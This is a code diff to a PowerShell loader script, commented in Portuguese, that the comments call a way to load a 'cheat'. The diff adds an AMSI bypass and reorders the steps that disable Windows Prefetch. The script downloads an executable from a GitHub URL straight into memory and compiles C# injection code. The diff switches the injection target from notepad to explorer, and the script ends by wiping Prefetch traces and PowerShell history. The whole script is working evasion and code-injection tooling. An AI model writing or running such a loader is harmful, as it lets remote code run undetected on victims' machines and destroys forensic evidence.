@@ -1,3 +1,10 @@
+# 1. Bypass do AMSI
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# 2. Desativa o Prefetch temporariamente
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
+
+# 3. Código C# para injetar (AGORA DENTRO DA VARIÁVEL $payload)
 $payload = @"
 using System;
 using System.Runtime.InteropServices;
@@ -27,19 +34,16 @@ public class GhostInject {
 }
 "@
 
-# 1. Desativa o Prefetch
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
-
-# 2. Baixa o cheat em memória
+# 4. Baixa o cheat em memória
 $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
 $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 
-# 3. Carrega o C# na memória do PowerShell
+# 5. Carrega o C# na memória
 Add-Type -TypeDefinition $payload -Language CSharp
 
-# 4. Injeta no Notepad
-[GhostInject]::Run("notepad", $bytes)
+# 6. Injeta no explorer (ou notepad, se preferir)
+[GhostInject]::Run("explorer", $bytes)
 
-# 5. Restaura o Prefetch e limpa o histórico
+# 7. Restaura o Prefetch e limpa histórico
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
